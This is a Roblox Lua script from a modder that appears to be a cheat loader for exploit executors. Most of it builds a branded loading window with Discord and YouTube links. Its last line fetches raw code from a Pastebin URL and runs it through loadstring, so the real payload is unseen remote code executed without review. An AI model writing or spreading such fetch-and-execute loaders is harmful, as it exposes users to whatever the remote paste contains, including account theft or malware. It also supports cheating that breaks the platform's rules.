-- Subscribete, Youtube: Joao_mods
 
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
 
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
 
-- Principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "JmodsLoadingUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui
 
-- Ventana
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 230) 
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BackgroundTransparency = 0.8
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui
 
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(0, 170, 255)
stroke.Thickness = 2
stroke.Transparency = 0.3
 
-- Título
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)
title.Text = "Jmods Universal"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.BackgroundTransparency = 1
 
-- Leyenda
local subtitle = Instance.new("TextLabel", frame)
subtitle.Size = UDim2.new(1, -20, 0, 50)
subtitle.Position = UDim2.new(0, 10, 0, 55)
subtitle.Text = "Cargando Jmods, espera un momento..."
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.TextScaled = true
subtitle.TextWrapped = true
subtitle.Font = Enum.Font.Gotham
subtitle.BackgroundTransparency = 1
 
-- Barra de carga
local progressBarBg = Instance.new("Frame", frame)
progressBarBg.Size = UDim2.new(1, -40, 0, 12)
progressBarBg.Position = UDim2.new(0, 20, 0, 125)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BackgroundTransparency = 0.4
progressBarBg.BorderSizePixel = 0
Instance.new("UICorner", progressBarBg).CornerRadius = UDim.new(0, 6)
 
local progressFill = Instance.new("Frame", progressBarBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
progressFill.BorderSizePixel = 0
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)
 
-- Animar
TweenService:Create(progressFill, TweenInfo.new(2, Enum.EasingStyle.Linear), {
    Size = UDim2.new(1, 0, 1, 0)
}):Play()
 
-- rainbow
local hue = 0
RunService.RenderStepped:Connect(function()
	hue = (hue + 0.01) % 1
	progressFill.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
	stroke.Color = Color3.fromHSV(hue, 1, 1)
end)
 
-- Botón Discord
local discordBtn = Instance.new("ImageButton", frame)
discordBtn.Size = UDim2.new(0, 50, 0, 50)
discordBtn.Position = UDim2.new(0.5, -70, 1, -65)
discordBtn.Image = "rbxassetid://18505728201" -- Icono Discord
discordBtn.BackgroundTransparency = 1
discordBtn.MouseButton1Click:Connect(function()
	local url = "https://discord.gg/jtSvZ3bhHj"
	pcall(function()
		StarterGui:SetCore("OpenUrl", { Url = url })
	end)
	if setclipboard then setclipboard(url) end
end)
 
-- Botón YouTube
local ytBtn = Instance.new("ImageButton", frame)
ytBtn.Size = UDim2.new(0, 50, 0, 50)
ytBtn.Position = UDim2.new(0.5, 20, 1, -65)
ytBtn.Image = "rbxassetid://5527947485" -- Icono YouTube
ytBtn.BackgroundTransparency = 1
ytBtn.MouseButton1Click:Connect(function()
	local url = "https://www.youtube.com/@joao_mods0"
	pcall(function()
		StarterGui:SetCore("OpenUrl", { Url = url })
	end)
	if setclipboard then setclipboard(url) end
end)
 
 
-- Draggeable
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
 
-- cerrar
task.wait(2)
local info = TweenInfo.new(1)
TweenService:Create(stroke, info, {Transparency = 1}):Play()
TweenService:Create(frame, info, {BackgroundTransparency = 1}):Play()
TweenService:Create(title, info, {TextTransparency = 1}):Play()
TweenService:Create(subtitle, info, {TextTransparency = 1}):Play()
TweenService:Create(discordBtn, info, {ImageTransparency = 1}):Play()
TweenService:Create(ytBtn, info, {ImageTransparency = 1}):Play()
TweenService:Create(progressFill, info, {BackgroundTransparency = 1}):Play()
TweenService:Create(progressBarBg, info, {BackgroundTransparency = 1}):Play()
 
task.delay(1.1, function()
	screenGui:Destroy()
end)
 
--script
task.wait(0.000000000000000001)
loadstring(game:HttpGet("https://pastebin.com/raw/TXwmgLpE"))()
 
